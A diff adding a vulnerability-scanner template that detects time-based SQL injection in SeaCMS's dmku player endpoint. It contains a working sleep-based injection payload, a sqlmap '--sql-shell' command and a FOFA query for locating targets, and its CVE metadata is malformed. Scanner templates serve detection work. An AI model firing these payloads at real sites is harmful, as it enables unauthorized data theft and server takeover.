@@ -1,0 +1,50 @@
+id: 2024-105221050
+
+info:
+  name: SeaCMS海洋影视管理系统dmku存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    SeaCMS是一套专为不同需求的站长而设计的视频点播系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选。
+    SeaCMS dmku存在SQL 注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等
+  reference:
+    - https://blog.csdn.net/weixin_43167326/article/details/139016633
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-105221050
+    cvss-score: 7.8
+    cwe-id: CWE-89
+  metadata:
+    date: 2022-10-08
+    version: SeaCMS
+    fofa-query: app="海洋CMS"
+
+  tags: sqli
+
+# python sqlmap.py -u "http://xxxx?id=1*" --sql-shell 
+
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(3)))v)&type=list HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=hlfl5flck9q3ng1blehhv86s4s
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+ 
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=3'
+          - 'status_code == 200'
+        condition: and
+
